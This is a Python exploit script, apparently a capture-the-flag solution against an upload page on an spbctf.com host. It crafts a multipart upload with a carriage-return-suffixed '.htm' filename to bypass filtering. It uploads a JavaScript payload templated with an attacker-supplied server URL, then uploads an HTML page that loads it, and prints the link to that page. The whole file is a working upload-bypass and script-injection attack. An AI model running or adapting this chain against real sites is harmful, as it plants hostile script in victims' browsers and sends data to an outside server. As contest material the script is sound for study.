import re
import sys
import requests
from urllib.parse import urlparse

headers = {
	"Content-Type": "multipart/form-data; boundary=---------------------------37753755782959811234703792032"
}


def read_file(filename):
	f = open(filename, "r")
	content = f.read()
	f.close()
	return content


def generate_formdata(data):
	return b"""-----------------------------37753755782959811234703792032
Content-Disposition: form-data; name="uploaded_file"; filename="y.htm\r"
Content-type: text/html

""" + data.encode("ascii") + b"""
-----------------------------37753755782959811234703792032
Content-Disposition: form-data; name="submit"


-----------------------------37753755782959811234703792032--"""


def upload_data(data):

	data = generate_formdata(data)

	r = requests.post("http://nghost.spbctf.com/upload.php",data=data,headers=headers)

	url = re.findall(r'"(/download\.php\?dl_raw&uuid=[\w\d_-]+)"', r.text)

	if url:
		return url[0]
	else:
		return False


def main(poc_path, main_path, poc_server):
	poc_content = read_file("poc.js")
	main_content = read_file("main.html")
	poc_url = urlparse(poc_server)

	if poc_url.scheme == '' or poc_url.netloc == '' or poc_url.path == '':
		print("Bad poc_server\nExample: http://example.org/")
		return

	poc_file = upload_data(poc_content.format(poc_server=poc_url.geturl()))

	if not poc_file:
		print("Fail upload poc")
		return

	main_file = upload_data(main_content.format(poc=poc_file))

	if not main_file:
		print("Fail upload payload")
		return

	print(main_file)


if len(sys.argv) < 4:
	print("USAGE: {} poc_path payload_path server_url".format(sys.argv[0]))
else:
	main(sys.argv[1], sys.argv[2], sys.argv[3])